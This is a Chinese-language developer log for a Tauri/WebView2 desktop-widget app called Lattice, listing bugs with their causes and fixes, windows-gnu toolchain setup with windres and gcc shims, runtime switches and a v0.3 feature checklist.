| `diagnostics.rs` 编译报一堆语法错，位置全在 JS 字符串里 | 上报脚本里有 `split("#")`，而裸字符串写成了 `r#"..."#` —— `"#` 就是结束符，字面量在 `split(` 处被截断 | 用 `r##"..."##`；顺手加一条单测：源码里不许出现 `//`（压成一行时它会把后面全注释掉） |
| 改完 `src-tauri` 里的文件，`tauri dev` 重建出来的进程直接 panic：`HRESULT(0x800700AA) The requested resource is in use` | 文件监听触发重建，但旧的 `lattice.exe` 还活着，两个实例抢同一个 WebView2 用户数据目录 | 改 Rust 之前先停掉 app（或至少确认 `tasklist` 里没有残留进程）；前端改动走 HMR，不用停 |
| 组件拖到屏幕边缘外面，之后就再也拖不回来                                 | 拖动完全按指针位移走，没有任何边界约束；唯一能抓的按钮在窗口右上角，跟着窗口一起出界                          | `widgetHost.ts::clampAnchor`：以那颗按钮为锚点，至少留 24px 在某块显示器**工作区**内；按锚点选屏，跨屏拖动才不会被接缝卡住 |
| 加了几条待办，回头只剩一条                                            | 画布上一个实例、桌面窗口一个实例，各持一份内存列表。A 加完 B 还停在旧列表，B 随便动一下就整块写回去                      | Rust 每次落盘后广播 `lattice:widget-store`，两个宿主转成 `store-changed` 推给 iframe；组件收到就重读，自己的写入还在飞时推迟到落地 |
| 组件在桌面上的位置停在任务栏底下，按钮点不到                                | 夹边界用的是 `monitor.size`（含任务栏），不是 `monitor.workArea`                                            | `screenBoxes` 取 `workArea`，取不到才退回 `size`                                  |
| 切"置顶"没反应，组件还趴在桌面层                                         | 守卫摘得比 `HWND_TOPMOST` 晚：那一下 SetWindowPos 被守卫改写掉了                                                | 守卫状态用窗口属性做开关，`apply_to` 里**先翻开关再落层级**                                  |
| 属性面板改了尺寸，桌面上的组件纹丝不动                                       | `buildSpecs` 优先用 `desktopRects` 里的尺寸（那是用户拖边缘改过的真实值），只写 `placement.w/h` 会被它盖掉                      | 提交尺寸时两处一起写；`desktopRects` 有记录才写它                                         |
| 待办里字打进去了，回车什么都不发生，列表永远是 "Nothing here yet" | iframe 沙箱是 `sandbox="allow-scripts"`，没有 `allow-forms` —— 浏览器会把表单提交整条拦掉，`submit` 事件不触发，也不报错 | 沙箱补上 `allow-forms`（`widgetHost.ts` 与 `WidgetFrame.tsx` 两处）；`tests/todo-add.html` 钉住：同一条提交路径，有这一位就写盘，没有就 0 次写盘 |
| 点待办输入框的右端，组件被钉住 / 直接被关掉 | 桌面窗口的功能图标浮在右上角 `top:6 right:6`、约 97×28，盖在组件内容之上而且**能点**；待办的第一行恰好是通栏输入框 | 组件顶部留一条 22px 标题栏（`padding-right: 96px`）把窗饰让出去，写进 WIDGET_SPEC §5.1 |
| 便签打字时右上角那排按钮一直挡着第一行 | 同一条窗饰，但症状不是"点错"而是"看不见"：正文从 10px 就起排，而窗饰靠 `body:hover` 显示 —— 打字的人手不离键盘、指针一动不动，它也就一动不动地压着正在写的那行 | 便签顶上留 24px 状态条（把底栏的保存状态挪上来，空带会像排版坏了），正文从 40px 起排；`tests/note-layout.html` 7 条断言量死正文起点与安全区宽度 |
| 磨砂底板上，右上角那排按钮像浮在雾里、颜色跟它压着的那块底板对不上 | 按钮底色是拿"壁纸**平均色**"算的，而它底下压着的是**那一小块**壁纸。绿底板上摆一枚按全局平均色算出来的橄榄色按钮，看着就像没对准 | 窗饰不跟底板算色：`--lattice-chrome` / `--lattice-chrome-fg` 是一对固定中性色（卡片浅就白、深就炭），图标也换成正文色而不是 muted |
| 底板调成浅色之后，组件的状态字（"Saved"、待办计数）淡得看不见 | 强调色写死在主题里：深色主题那支薄荷绿 `#5dcaa5` 压在浅底板上几乎没有对比度 | 合成亮度决定明暗之后，`--lattice-accent` 一起翻（浅用 `#0f6e56`、深用 `#5dcaa5`），组件本来就只读令牌，不用改代码 |
| 底板一改，没改过的组件也"变了一点" | 脚本无条件把 `--lattice-surface` / `--lattice-text` / `--lattice-border` 覆盖成"近似主题"的值，出厂外观下这些近似值跟主题本身有细微差别 | 出厂外观（`auto / 1 / 0`）一个令牌都不覆盖，`isPlainAppearance()` 判断后直接 `removeProperty`，默认样子跟没有这个功能时一模一样 |
| 壁纸层四条边发黑 | 模糊的边缘要往外扩，`filter: blur()` 在 canvas 边界上会把外面的透明像素平均进来 | canvas 比卡片四周各大 `2 × MAX_BLUR`（80px），模糊的尾巴落在卡片外面，被窗口圆角裁掉 |
| 拖窗口时磨砂底"追不上"，停下来还是最初那一张 | 截图是异步的（一张约 24ms + IPC），拖动时每 120ms 就来一次，`wallpaperLoading` 一挡，后面全被丢掉 | 挡的时候记一个 `wallpaperDirty`，`finally` 里发现脏了就补截一张 —— 只补最后一次位置，不排队 |
| 屏幕上看着只有一个组件，实际上跑着两份 WebView2；「收回」只关得掉一个 | 启动恢复和 120ms 防抖同步**并发**触发，两条 `sync_widget_windows` 都先查到 `get_webview_window(label) == None`，然后各自 `build()` 一次 —— 同一个实例被建出两个窗口，一个归 Tauri 管，另一个成了孤儿 | `desktop.ts` 里把同步串成一条链（`serial()`），同一时刻只允许一条在飞；位置/层级幂等，后一条排队跑即可 |
| 「投放到桌面」按钮点了永久变灰，界面上什么都没发生 | 上一条并发的副作用：同时建窗口把 WebView2 的创建排到几十秒，IPC 的自定义协议先超时（`Failed to fetch`），退到 postMessage 之后长命令的响应再也回不来 —— `desktopBusy` 停在 true | 根因靠串行化解决；同时给 `syncDesktop` / `closeDesktop` 套 `withTimeout`，超时报错并解锁按钮，别让人除了重启没别的办法 |
| 关掉主窗口之后既退不出也回不来 | 没有 `CloseRequested` 处理，也没有托盘：主窗口被销毁，组件窗口还在（进程不退），但没有任何入口能把主窗口要回来，只能去任务管理器 | 桌面上还有组件时 `prevent_close()` + `hide()`；真退出走设置菜单的 `Quit Lattice`（`quit_app`）；再点一次图标由单实例唤回主窗口 |
| 两个 Lattice 同时跑，布局互相覆盖 | 没有实例锁。两个进程各建一套组件窗口，还同时往 `state.json` 里写，谁后写谁覆盖 | `instance.rs`：命名互斥体 `Local\Lattice.Instance` 判重 + 命名事件 `Local\Lattice.Wake` 唤回。互斥体句柄**不能**关，关了对象就消失，下一个进程会以为自己是第一个 |
| 属性面板里撤销了 `storage`，桌面上那个组件照样能读写磁盘 | 权限只在两个地方"记着"：`HostConfig.permissions`（`create()` 时写一次，之后没人更新）和宿主页的 `const granted`（启动时建一次，之后没人动）。`Applied` 那一套 diff 里根本没有权限这一维，所以同步跑了也发现不了变化 | `sync_widget_windows` 每轮比对权限（**排序去重后**比，否则 grants 数组换个顺序会被当成"变了"），变了就 `emit_to` 一条 `lattice:widget-permissions`；宿主页就地清空重填 `granted`（桥每次调用都读它，下一次请求立刻被拒），再 `reloadWidget()` 让组件按新权限重走一遍初始化 |
| 主窗口最小化之后，画布上的组件还在按心跳空转（系统监控那张卡的数字还在变） | `document.visibilityState` 对"窗口最小化"完全无感 —— 实测最小化前后都是 `visible`。WebView2 只在**整个 webview 被藏起来**时才翻这个属性，而最小化只是把窗口收进任务栏，渲染进程照跑。于是调度器那句"不可见就停摆"在桌面端从来没生效过 | `visibility.rs` 盯 `WindowEvent::Resized`（最小化/还原在 Windows 上都是 `WM_SIZE`，最小化那一下尺寸是 0×0），用 `is_minimized()` / `is_visible()` 算出真实可见性，变了才发 `lattice:window-visible`；`hide()` / `show()` 不动尺寸、不触发 Resized，由调用点显式补一次 `sync()`。调度器把这条信号和 `visibilityState` 取"与" |
| 热更新之后画布上的组件又跳起来了，窗口明明还最小化着 | 事件是"**变了才发**"，而页面可能是在窗口已经最小化**之后**才加载的（热更新、权限变更重载、改完 Rust 重启应用）。那一次"变成不可见"早就发生过了，只订事件会永远以为自己是可见的 | 页面第一次建调度器时主动拉一次 `getCurrentWindow().isMinimized()`（`hookWindowVisibility` 里那句动态 import），把初始状态补上。Rust 侧不能靠"重发一次"解决：`LAST` 去重就是为了挡住拖边缩放时几十次重复 emit |
| 改一个组件的外观 / 权限，桌面上**所有**组件一起变 | `emit_to(label)` 并不"只发给那个窗口"：JS 侧 `listen()` 注册的监听器 target 是 `Any`，而 Tauri 的匹配规则是 `target == Any \|\| filter(target)`（`event/listener.rs::match_any_or_filter`）—— 任何 emit 都会送到每个窗口的 `Any` 监听器上。于是拖 A 的 `Fill` 滑杆，四张卡片的底板一起动；撤 A 的一项权限，四个组件一起重载（未落盘的草稿当场丢） | 载荷里带身份，宿主页自己比对：`lattice:appearance` / `lattice:widget-permissions` 带 `instanceId`，`lattice:window-visible` 带窗口 `label`。真机验过：改 Clock 的权限只有 Clock 的 iframe 带上 `__lattice_reload`，另外三个的 `src` 原样；拖 Clock 的滑杆只有 Clock 的 `--lattice-surface` 变 |
| 在属性面板把权限勾回来，画布卡片上那句 `Needs Widget storage` 还挂着 | `missing` 只在点卡片上那颗 `Grant` 时清（`setMissing([])`），走属性面板这条路没人清 —— 组件其实已经能用了，界面还在喊缺权限 | 授权签名一变就按最新 `grants` 过滤一遍 `missing`（已经有的划掉，仍然缺的留着）。**不要**改成"权限一变就清空"：仍然缺的那几项要等组件下次撞上才重新出现，中间那段时间界面又会骗人 |
| 画布上的卡片自己消失了（组件数据还在），桌面窗口也没了 —— 前后撞到**三次** | `widget_close` → `lattice:widget-close` → 主窗口 `removePlacement`。第三次给 `widget_close` 加了 `reason` 和一行日志，当场抓到：两次都是 `reason: user`，也就是**宿主页那颗 ✕ 的 click 处理真的跑了**。在宿主页里再挂一层鼠标事件探针，抓到的是一条 `isTrusted: true` 的 `mousedown`，落点 `(203, 15)` —— 正是 220×180 窗口右上角那颗 ✕ 的中心（`target` 读出 `null` 是因为点在了按钮里的 `<svg>` 上，`data-act` 在父节点）。所以不是代码替它派发的，是**真鼠标事件**。但也不是必现：干干净净盯 70 秒，一次都没来 | ① 那一下是**真输入**（`isTrusted: true`），但**不是人**：后来有一轮我在只改 Rust 源码、完全没碰鼠标的几分钟里，四个窗口**各发了一条** `reason: user` —— 不是零星的，是成批的。所以"用户手滑"这个解释不成立，`✕` 的 click 仍然有来路不明的派发方，这条坑**没结**。② 架构上的毛病已经修了（见下一行，`reason` 分家 + 每次调用留一行日志 + 关闭可撤销）。③ 下次再撞到，先看 `[lattice] widget_close <label> (reason: user, …)` 那行里的点击特征：`trusted` + 真实坐标 + `detail: 1` 是真鼠标事件（可能是被重放的），`synthetic` 是脚本派的，`detail: 0` 且坐标 `0,0` 是键盘激活。这行在 Rust 侧打，终端里一定看得见。**别再靠"问一句"结案。** ④ 这条日志已经验过：用 CDP 往时钟窗口的 ✕ 上派发一次真点击，打出来是 `trusted detail=1 pointer=mouse at=140,20`（160 宽的窗口，✕ 中心就是 (140,20)）—— 和那几次的 `(203, 15)`（220 宽窗口的 ✕ 中心）**同一副样子**。也就是说那几次确实是"落在 ✕ 上的真实点击"。⑤ 同时验到：窗饰淡着的时候点下去会被手滑保护丢掉（`opacity 0` → 一条日志都没有）。反过来说，那几次**窗饰是可见的**，指针确实停在组件窗口上 —— 所以不是"窗口在鼠标底下刚建出来"那一下，是窗口已经在那儿、指针已经停在上面之后，才来了一次点击。这条线索指向"指针停在组件窗口上时，系统把别处的点击投给了它"，但还没抓到现行 |
| 组件的便签 / 待办内容被换成了出厂示例（`This is a Note` / `taskA·B·C`） | `widget-data/lattice.note.json` 与 `lattice.todo.json` 在 19:24:14 / 19:24:35 各被重写了一次，写进去的正是组件自带的**种子数据**。最可能的过程：某一次初始化里 `storage.get` 拿到 `null`（读失败、权限还没到位、或文件当时不在），组件走了"没数据就种一份"的分支，然后**把种子存了回去**。那两个时间点正是开发期反复重启 + 热更新 + 跑 headless 测试的时候 | ① 用户内容已尽量捞回：便签全文从 `.scratch/note-preview.html` 里取回，待办从截图里读回 4 条（另外 2 条滚出视野，找不回来）。② **平台侧的兜底已经补上**：`write_atomic` 覆盖前留一代 `.bak`（见 v0.3"组件数据落盘留一代备份"）。③ 组件侧要立规矩：**读失败 ≠ 没有数据**，读失败时绝不许把种子写回去（WIDGET_SPEC 已补） |
| 组件自己调 `window.close()` 之后，用户摆好的布局跟着没了 | 一条命令兼着两种语义："窗口关了"就等于"用户把它删了"。于是任何一次意外调用都变成**静默的数据丢失**，连日志都不留一行 | `reason` 把两件事拆开：只有 `reason == "user"`（宿主页 ✕）才发 `lattice:widget-close` 删 placement；别的来路只关窗口，实例记进 `Runner.suppressed`，本次运行不再重建（否则下一次同步又把它变出来，看着像"关不掉"）。`suppressed` 只在内存里 —— placement 一直躺在 `state.json`，下次启动照样回来。真机验过：`reason: widget` 之后窗口消失、四条 placement 一条不少、等 3 秒也不再冒出来 |
| 网络代理里**带自定义头的请求全部失败**，`GetLastError()` 只给 `ERROR_INVALID_PARAMETER (87)`；不带头的请求好好的 | `WinHttpSendRequest` 的 `dwHeadersLength` 是**字符数**，不是字节数。我按 UTF-16 的字节数传了 2 倍 —— 同一份代码里注册表那几个 API（`RegSetValueExW` 的 `cbData`）收的**是**字节数，凭手感写就错了 | 传 `header_wide.len() - 1`（字符数）。这条只有真机联调能发现：单元测试碰不到 WinHTTP，而"组件联网时灵时不灵"会让人往白名单、权限、DNS 方向查很久 |
| 崩溃守卫上线后，两个组件窗口在几十秒里各重载了一千多次，日志刷到 1.5MB，界面一直在闪 | 第一版把**认不出来**的 `ProcessFailed` kind 也当成"挂了"去重载。`--in-process-gpu` 下每次导航都会看到辅助进程退出（实测 kind 4 = `UTILITY_PROCESS_EXITED`），重载又触发下一次事件 | 只有明确知道"重载能修好"的 kind 才重载（渲染进程 / GPU），其余记一行就够。拿不准时重载的代价是"把一个偶发事件变成死循环" |
| 组件目录里放个文件，桌面上五个卡片一起重载 | `lattice:widgets-changed` 是广播（`emit` 到所有窗口），载荷如果不带路径，宿主页只能选择"全量重载" | 载荷带**相对路径**（`<id>/<file>`，第一段就是组件 id），宿主页按前缀筛；只有自己那份变了才 `reloadWidget()` |
| 托盘菜单改了"暂停"，设置菜单里的开关还是老样子 | 暂停的真相在 Rust（`Runner.paused`），主窗口的 `paused` 只是镜像。托盘改状态时不发事件，主窗口就永远不知道 | `apply_pause` 里 `emit_to("main", "lattice:paused", ...)`，主窗口收到就落 store；另外主窗口挂载时主动拉一次 `widgets_paused` —— 事件是"变了才发"，页面可能在事件之后才加载 |
| 暂停中的组件窗口恢复之后跑到最前面来了 | `window.show()` 就是 `ShowWindow`，它会把窗口提到最前 —— 而恢复之后层级还停在 `HWND_BOTTOM` / `WorkerW` 的旧印象里 | 恢复时先 `show()` 再重放一次层级（`desktop::apply_to`），顺序反了就等于没压下去 |
| 开机自启开关打开、重启却没起来；或者起来的还是旧的开发版 | 注册表里那条命令指向的是上一次的 exe（换过安装位置、升级过、或者开发时写进去的 `target\debug\lattice.exe`）。注册表不会自己跟着走 | 启动时对账：`autostart::reconcile()` 发现注册的那条不是当前 exe 就改写（只改已存在的，不会顺手打开）。debug 构建跳过 —— 否则 `tauri dev` 一次就把用户的自启劫持到开发产物上 |
| 给 WebView2 加上 `--remote-debugging-port` 之后，应用起来了、窗口标题也在，但**一个 `msedgewebview2` 子进程都没有**，端口不监听，窗口里什么都没有 | `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` 里那条参数让 WebView2 的创建直接失败了（本机环境如此，去掉这个变量立刻正常）。表面症状极像"应用卡住" —— 日志里只有两条 watcher，什么都没有 | 别用 CDP 端口验界面：改成"临时把要验的状态默认成打开 / 关闭，截一张窗口图，然后改回来"。窗口截图用 `GetWindowRect` + `ImageGrab(bbox=..., all_screens=True)`，比 CDP 少一整条依赖 |
| 用 `mouse_event` 合成点击，坐标明明在窗口里（`WindowFromPoint` 也确认了），界面毫无反应 | 注入的输入到不了 WebView2 的渲染进程 —— 而且前台窗口随时会被别的应用（聊天工具）抢走，`SetForegroundWindow` 从后台进程调经常是**静默失败**的 | 别靠合成点击验交互。交互逻辑放进能自动化跑的页面（`tests/debug-panel.html` 直接 `.click()`），真机只看"渲染出来的样子" |
| 组件测试页里面板渲染成一堆裸 HTML：按钮是系统默认样式、行挤成一坨 | 面板的样式全在 `src/styles.css`（令牌 + `.lattice-debug-*`），而测试页只 import 了组件，没有 import 平台样式表 | 组件级测试页第一行就 `import "../src/styles.css"`。平台组件不是自带样式的独立件，它们靠全局那一层 |
| `tests/sdk.html` 偶尔报"启动时向宿主报了一次 ready"，重跑又好了 | `postMessage` 是**宏任务**，而 `await` 子窗口的 promise 只排**微任务** —— 微任务先跑完。所以"子页面已经发了 ready"不代表"父页面的监听器已经收到" | 跨窗口的断言一律用 `waitFor(条件, 超时)` 轮询，别直接断言。这条是真机上整套测试一起跑、机器忙的时候才暴露的 |
| 正在播放组件启动后，"来源"那一格永远是空的，别的都正常 | 启动链最后一句 `.then(() => { el.source.textContent = "" })` 是重构时的残留，它跑在**第一次 render 之后**，把刚画上去的播放器名抹掉了 | 渲染函数只有一个入口。启动链里只做"订阅 + 报 ready"，不碰 DOM —— 想清空就清空数据再 render 一次 |
| 没有会话时进度条还在，显示一条空槽加 `--:--` | 那一支写的是 `el.progress.hidden = !showProgress`，把"用户关掉了进度条"当成了唯一的隐藏条件，忘了"没有会话"也该隐藏 | 隐藏条件写全：`!showProgress || duration <= 0`（或者干脆在没会话的分支里直接 `hidden = true`）。空槽看着像还没加载完 |
| 组件测试里改配置之后，组件读到的还是旧值 | 假宿主里 `setConfig()` 只更新了自己的一个 `pollMs` 变量，而 `config.get` 回的是**启动时捕获的那个对象** —— 两份数据，各改各的 | 假宿主必须让 `config.get` 和 `config-changed` 读同一份对象（`Object.assign(config, next)`）。测试替身自己有两份状态，是最难查的一类"测试通过但功能是坏的" |
| 目录里六个组件全都报 "has no publisher key"，可 `registry.json` 里明明写着 `publisher` | 写目录的脚本把 `publisher` 放在**根**上（一处写、六个条目共用），而解析只认**条目级**的。两层结构里"字段放哪一层"是两个人的约定，脚本和解析各写一半就是这种结果 | 条目级优先、没有就继承根级（`rootPublisher`）。这类"一个字段两个层级"的格式，两边必须同一份样本验过 —— 单测里补了 3 条断言，但真机探针是唯一能抓到它的地方 |
| 验签单测"全绿"，可签名其实是错的 | 测试向量是**凭印象写**的（`e556…` 开头那一串），断言和假数据一起错，红不了 | 向量必须是**生成**的：用 Node 的 `crypto.sign` 真签一次，把 `sha256 / signature / publicKey` 原样贴进 Rust 单测。跨语言验签的测试数据没有"大概对"，只有"从对面拿过来的" |
| `.scratch` 里的验签壳子编不过：`unresolved import ed25519_dalek` / `crate::protocol` 找不到 | `rustc --test 壳子.rs` 只编这一个文件，不会替你解析 `Cargo.toml` 里的依赖，也没有 `crate::` 下的兄弟模块 | 加 `-L src-tauri/target/debug/deps --extern ed25519_dalek=<rlib> --extern sha2=<rlib>`；`csp.rs` 只用到 `protocol::SCHEME`，桩一个常量即可。桩的值要抄对 —— 抄成 `lattice`（真值是 `lattice-widget`）时单测会红，这次正好被它抓了一下 |
| 下载 16MB 的组件包，sha256 永远对不上，报"下载损坏" | 中间那一层顺手 `String::from_utf8_lossy` 转了一道字符串：非 UTF-8 的字节全变成 U+FFFD，二进制当场报废。上传下载这类管道里，**任何一次"顺手转成字符串"都是不可逆的** | `network::send` 改成返回 `Vec<u8>`，上限由调用方给（目录 2MB / 包 16MB）；`network_fetch` 只在最后一步转字符串。同一个函数服务两种用途时，最底层那个类型要选得够宽 |
| 画布参考线改成"中间实线、两头虚线"之后，端头的虚线几乎看不见（实测只剩 5% 亮度），像"线没画出来" | `mask-image` 遮的是**元素和它的全部子内容**。实线的遮罩（两端透明）写在 `.lattice-guide` 上，同一元素里的 `::after` 虚线被它一起遮掉了 —— 两层变成了两层遮罩的乘积 | 两层都改成伪元素（`::before` 实线 / `::after` 虚线），元素自己不带遮罩；兄弟之间的遮罩互不影响。这条是截屏取像素比出来的（Chrome headless + `System.Drawing` 采样），肉眼只会觉得"线有点淡"。**后来那两层遮罩连同渐隐端头一起删掉了**（线改成局部虚线之后不再需要淡入淡出，一个 `repeating-linear-gradient` 就够），但坑本身留着 —— 往那个元素上加 `mask-image` 或 `filter` 会连它的子内容一起遮/一起模糊 |
| 系统卡片的逐核条偶尔全部归零，或者显示成一排和实际负载对不上的高度，下一拍又自己好了 | 逐核数据是"这一拍每个核的累计计数"，要和**上一拍的数组按索引相减**。休眠唤醒 / CPU 热插拔会让核数变（8 → 16），按索引对上去就是拿 A 核的计数减 B 核的 | `metrics_policy::per_core` 发现长度不一致就返回**空数组**，组件把那一行收起来，下一拍自然恢复。宁可不画，也别画一条看着合理、其实全错的曲线 |
| 刚给这台机器装了真的 gcc（`ring` 要它），Rust 这边反而编不动了 —— 停在 `resource.rc` 上，只有一句 `windres: preprocessing failed.` | 预处理 `.rc` 时 windres 会自己 spawn `gcc -E -xc-header`，而 MSYS2 的 gcc 16.2.0 对**任何** `-x` 都静默退出 1（`gcc -E -x c foo.c` 一样是 1，一个字的诊断都没有）。装真 gcc 之前这里走的是 `gcc-shim`，它不认参数、也就不碰 `-x`，所以同一个故障是"修好一个坏掉另一个" | `.toolchain/windres-shim/x86_64-w64-mingw32-windres.exe`：往参数里塞一句 `--preprocessor <.toolchain>/gcc-shim/gcc.exe` 再转发给真 windres（棂的 `resource.rc` 没有 `#include` / `#ifdef`，"原样复制"就是正确的预处理结果），`-V` / `--version` 的探测请求原样转发（`embed-resource` 靠它认编译器种类）；`scripts/tauri.mjs` 发现这个目录就把它排到 PATH 最前。**两个 shim 各管一件事**：`windres-shim` 管"谁来预处理"，`gcc-shim` 管"预处理怎么做" —— `ring` 的 `.c` 仍然必须走真 gcc |
| assistant 小窗一开，整个应用（连托盘）都僵住，Ctrl+K 也没反应，只能去任务管理器 | 三个 `assistant_window_*` 命令写成了同步 `fn`：同步命令跑在主线程，而建窗口的 `build()` 要把活投递回主线程再等结果 —— 命令占着主线程等自己 | 三个全改成 `pub async fn`，和 `sync_widget_windows` / `widget_close` 同一条规矩（AGENTS §5）。这类死锁 v0.2 就撞过一次，那条记的是"建窗口的命令必须 async"；这次是**新加的命令**又忘了一遍 —— 加任何碰窗口的命令之前，先回去看那三条 |
| 在小窗里让它"把这个组件挪一下"，挪完主窗口里的布局像退回到启动那一刻（新摆的组件没了、主题也换回去了） | `state.json` 不是状态本身，它只是主窗口那份 store 的**磁盘副本**。小窗是第二个 webview、也是第二个 store：它拿启动时的快照跑执行器、再把整份状态写回磁盘，等于把主窗口这一段时间的所有改动整块盖掉 | 执行器只留在主窗口。`platform/assistant.ts` 抽出 `AssistantSurface`：抽屉 `localSurface(records)` 本地跑，小窗 `remoteSurface()` 把 `assistant_snapshot` / `assistant_act` 交给 `agent.rs`，走 agent 端点**同一条** `call_frontend` 通道，动作照旧先过 `agent_policy` 的白名单。**判据**：凡是"要改桌面"的东西只能在持有 store 的那个窗口里发生，别的窗口最多转发 |
| 提交量显示成"15 MB / 24 MB"，比任务管理器小 4096 倍 | `PERFORMANCE_INFORMATION` 里的 `CommitTotal` / `CommitLimit` / `SystemCache` 单位是**页**，不是字节 | 乘 `PageSize` 再用。同一个结构体里 `ProcessCount` / `ThreadCount` / `HandleCount` 是**计数**、不用乘 —— 一个结构体里混着两种单位，抄字段的时候要一个字段一个字段看 |

### 环境与构建（windows-gnu）

默认工具链是 `stable-x86_64-pc-windows-gnu`，它不自带 `windres`，也没有 `gcc`，  
而 `tauri-build` 要用 `windres` 编译 `resource.rc`、`windres` 又要调 `gcc -E`。

`scripts/tauri.mjs` 在启动 `tauri` 之前把目录塞进 `PATH`：

```
.toolchain/intl                 # ld 的两个 DLL（libintl-8 / libiconv-2），排最前
.toolchain/windres-shim         # 替身 windres：预处理改用 gcc-shim（有真 gcc 时必须用它）
.toolchain/msys64/mingw64/bin   # 完整 mingw-w64 工具链（gcc + as + ld + binutils）
.toolchain/mingw64/bin          # 只有 binutils（windres.exe 在这里）
.toolchain/gcc-shim             # 只做透传的 gcc.exe —— 没有真 gcc 时才用它
```

顺序是这四条规矩：**`intl` 在最前**（它和工具链不是一回事，缺了 `ld` 连 `--version` 都跑不起来）、**`windres-shim` 在真 gcc 之前**（windres 是按名字找 `x86_64-w64-mingw32-windres`）、**真 gcc 在 `mingw64/bin` 之前**（它的 as/ld 要和自带 binutils 配套，混用两套会出怪问题）、**`gcc-shim` 只在没有真 gcc 时才出现**。

`npm run tauri:dev` / `tauri:build` 都走这个包装脚本，所以直接跑就行。  
换到 MSVC 工具链（`rustup default stable-x86_64-pc-windows-msvc`）就不需要这一套了。

**为什么后来必须装一个真的 gcc。** 加了自动更新之后依赖里第一次出现 `ring`（更新器的 TLS 用它），它有一批 `.c` 文件要现编。而 `gcc-shim` 只会**把 `.c` 原样拷成 `.o`** —— 它本来只服务 `windres` 的预处理。结果是一堆"内容其实是 C 源码"的目标文件，链接时几百行 `undefined reference to ring_core_0_17_14__…`，看着像 ABI 或 LTO 问题，实际是根本没编译过。诊断方法很简单：`od -An -tx1 -N8 <ring 的 .o>`，正常目标文件开头是机器码，这里是 `2f 2f 20 43`（`// C`）。

装法（不需要 pacman，也不动系统 PATH）：从 MSYS2 镜像取 `gcc` / `crt` / `headers` / `winpthreads` / `isl` / `gmp` / `mpfr` / `mpc` / `zlib` / `zstd` / `libgcc` / `libstdc++` 这批 `.pkg.tar.zst`，用系统自带的 `bsdtar`（`C:\Windows\System32\tar.exe`，带 libzstd）直接解到 `.toolchain/msys64/`。包装脚本发现 `.toolchain/msys64/mingw64/bin/gcc.exe` 就把它排在最前、并且**不再**放 `gcc-shim`。

**装了真 gcc 之后还多一层 `windres-shim`。** windres 预处理 `.rc` 时会自己 spawn `gcc -E -xc-header`，而 MSYS2 gcc 16.2.0 对**任何** `-x` 都静默退出 1（没有一个字的诊断），windres 于是只报一句 `windres: preprocessing failed.`。替身做的事只有一件：把 `--preprocessor <.toolchain>/gcc-shim/gcc.exe` 塞进参数再转发给真 windres（`.rc` 里没有 `#include` / `#ifdef`，"原样复制"就是正确的预处理结果），`-V` / `--version` 的探测请求原样转发。改了它要重编，命令在 `windres-shim.rs` 的文件头。

**`cargo test` 在这台机器上跑不了。** 本机安全策略禁止写 `target\debug\deps\*.exe`，而测试二进制正好生成在那里 —— 表现是链接出来的 exe 不完整，一跑就 `0xc0000139 STATUS_ENTRYPOINT_NOT_FOUND`（看着像链接错误，其实是文件没写全）。同一个策略也是"dev 任务莫名挂掉、报 `beforeDevCommand terminated with a non-zero status code`"的真正原因：`cargo` 想写 `deps\lattice-*.exe` 被拒。

换 `CARGO_TARGET_DIR` **也不行** —— 试过 `.scratch/cargo-target`，规则匹配的是 `deps\*.exe` 这个形状，换目录照样拦（还白编了 7 分钟依赖）。所以这台机器上 Rust 单测（`diagnostics.rs` 14 条、`protocol.rs` 6 条、`widget_store.rs` 5 条）只能靠 `cargo check` 保证能编过，**实际执行得去 CI 或者别的机器** —— `ci.yml` 的 `rust` job 现在就在 `windows-latest` 上跑 `cargo test --lib`，那是这 21 条唯一会跑的地方。绕法是单文件模块写个 `rustc --test` 壳子（见 AGENTS §11），能这么跑的有 77 条。

### 运行时开关

| 变量                                          | 作用                                      |
| ------------------------------------------- | --------------------------------------- |
| `LATTICE_GPU=1`                             | 不注入 `--in-process-gpu`，恢复 WebView2 默认行为 |
| `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=...` | 自己指定 WebView2 启动参数（优先级最高）               |

## v0.3 —— 平台能力

已完成的排前面，剩下的按依赖顺序排 —— 顺序不是审美，是"谁挡着谁"。

- [x] **组件坏了能看出来** —— 以前只有一种表现：白屏，分不清 404 还是 JS 崩了。现在三件事一起上：
  - **兜底页**：协议层失败时，文档导航拿到一页可读 HTML（`File not found` / `Widget not installed` / `File could not be read` / `Malformed request path`），带组件 id、请求路径、找过的目录、该怎么修。子资源请求仍然回空 body —— 往 `fetch()` 里塞 HTML 只会换来一个和真实原因无关的解析错误
  - **错误卡**：发组件 HTML 时注入一段上报脚本（沙箱 iframe 的异常宿主读不到），宿主叠一张贴底的卡：消息、`文件:行:列`、可展开堆栈、`Reload`。按严重程度挑主错误，脚本异常压过资源缺失，其余收进 `+N`；画布上退化成一行。**两条发文档的路都注**（用户组件走协议层、内置组件走前端构建），见下面那条"内置组件也上报错误"
  - **重载**：窗饰第 5 颗按钮 + 错误卡上的 `Reload` + 画布错误条上的 `Reload`，都是给 `src` 加时间戳重新导航，改完文件存盘就能看到新内容
  - `tests/diagnostics.html` 28 条断言（识别边界、两条通道不撞、去重指纹、主错误选择）+ `diagnostics.rs` 14 条单测（注入位置、幂等、行号不变、转义、状态码）
- [x] **重启后自动把组件放回桌面** —— `desktopMode` 改为持久化，启动时（水合完成 + 清单读到之后）重建一遍窗口。设置里留一条 `Restore on launch` 开关：有人把 Lattice 当纯设计工具用，不想一开就有一堆窗口。刻意**不**自动最小化主窗口 —— 开机就把窗口藏起来，用户会以为应用没打开
- [x] **单实例锁** —— Win32 命名互斥体 `Local\Lattice.Instance` + 命名事件 `Local\Lattice.Wake`，不引插件。第二次启动 `SetEvent` 一下就把已经在跑的那个的主窗口翻出来，然后本进程退出。两个实例同时跑会各建一套组件窗口、还同时往 `state.json` 里写
- [x] **撤销授权同步到已打开窗口** —— 以前 `HostConfig.permissions` 只在 `create()` 里写一次，之后再也不更新：用户在属性面板撤掉 `storage`，桌面上那个组件照样能读写磁盘。授权界面在说谎。现在 `sync_widget_windows` 每轮都比对权限（排序去重后比，否则 grants 数组换个顺序就会被当成"变了"），变了就 `emit_to` 一条 `lattice:widget-permissions`；宿主页就地清空并重填 `granted` 集合（桥每次调用都读它，所以下一次请求立刻被拒），再调 `reloadWidget()` 重走一遍初始化 —— 和画布那边重挂 iframe 的效果对齐
